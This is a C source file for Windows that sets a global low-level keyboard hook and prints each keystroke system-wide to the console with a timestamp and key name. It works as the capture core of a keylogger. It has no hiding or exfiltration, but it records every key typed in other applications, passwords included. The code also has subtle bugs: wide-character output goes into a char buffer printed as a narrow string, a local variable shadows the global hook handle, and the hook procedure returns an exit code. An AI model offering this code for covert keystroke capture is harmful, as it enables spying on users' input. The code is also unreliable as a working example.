#include <minwindef.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>


// function declaration
LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);


// global variables
HHOOK keyboardHook;
SYSTEMTIME stUTC;


int main() {

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!keyboardHook) {
        fprintf(stderr, "Error: Failed to set keyboard hook. Error code: %lu\n", GetLastError());
        return EXIT_FAILURE;
    } else {
        wprintf(L"Keyboard hook set successfully.\n");
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return EXIT_SUCCESS;
}

LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode == HC_ACTION) {

        GetSystemTime(&stUTC);
        char keyName[50] = { 0 };
        BYTE keyboardState[256];

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* pKeyInfo = (KBDLLHOOKSTRUCT*)lParam;

            switch (pKeyInfo->vkCode) {
                case VK_BACK:   strcpy(keyName, "Backspace"); break;
                case VK_RETURN: strcpy(keyName, "Enter"); break;
                case VK_TAB:    strcpy(keyName, "Tab"); break;
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT: strcpy(keyName, "Shift"); break;
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL: strcpy(keyName, "Control"); break;
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:  strcpy(keyName, "Alt"); break;
                case VK_LWIN:
                case VK_RWIN:   strcpy(keyName, "Windows key"); break;
                case VK_ESCAPE: strcpy(keyName, "Escape"); break;
                case VK_SPACE: strcpy(keyName, "Space"); break;
                case VK_VOLUME_DOWN: strcpy(keyName, "Volume Down"); break;
                case VK_VOLUME_UP: strcpy(keyName, "Volume Up"); break;
                case VK_VOLUME_MUTE: strcpy(keyName, "Mute"); break;
                case VK_PLAY: strcpy(keyName, "Play"); break;
                case VK_PAUSE: strcpy(keyName, "Pause"); break;

                default:
                    if (GetKeyboardState(keyboardState) == FALSE) {
                        fprintf(stderr, "Error: Failed to get keyboard state. GetLastError = %lu\n", GetLastError());
                        return EXIT_FAILURE;
                    }
                    if (ToUnicode(pKeyInfo->vkCode, pKeyInfo->scanCode, keyboardState, (LPWSTR)keyName, _countof(keyName), 0) == 0) {
                        // Fallback to GetKeyNameText for other keys (like F1-F12, Home, etc.)
                        // Bit 24 indicates an extended key, such as the right-hand ALT and CTRL keys.
                        LONG lParam_for_getkey = (pKeyInfo->scanCode << 16) | ((pKeyInfo->flags & LLKHF_EXTENDED) << 24);
                        GetKeyNameTextA(lParam_for_getkey, keyName, sizeof(keyName));
                    }
                    break;
            }

            printf("[%04d-%02d-%02d %02d:%02d:%02d] 0x%02lX '%s'\n",
                    stUTC.wYear, stUTC.wMonth, stUTC.wDay,
                    stUTC.wHour, stUTC.wMinute, stUTC.wSecond,
                    pKeyInfo->vkCode, keyName);
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}
